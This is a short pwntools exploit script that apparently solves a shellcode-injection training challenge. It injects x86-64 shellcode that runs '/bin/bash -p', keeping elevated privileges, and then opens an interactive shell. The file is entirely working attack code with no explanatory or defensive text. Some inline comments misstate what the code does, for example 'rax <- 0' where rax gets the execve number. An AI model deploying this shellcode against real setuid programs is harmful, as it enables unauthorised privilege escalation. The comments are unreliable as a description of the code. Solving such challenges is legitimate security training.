from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = process("/challenge/babyshell_level4")

shellcode = asm(
"""
    jmp two
one:
    pop rdi //get file path,the 1st arg

    push 0x0  //end of -p
    push 0x702d // -p
    push rsp   // addr of -p
    pop rdx // rdx <- addr
    
    push 0x0  //end of argv
    push rdx  //addr of -p
    push rdi  //addr of /bin/sh
    push rsp  //addr of argv
    pop rsi   //rsi <- addr of argv
    
    push 0x0  //envp
    pop rdx   //rdx <- 0
    push 0x3b 
    pop rax   //rax <- 0
    
    syscall
two:
    call one
    .string "/bin/bash"
""")
p.send(shellcode)

p.interactive()
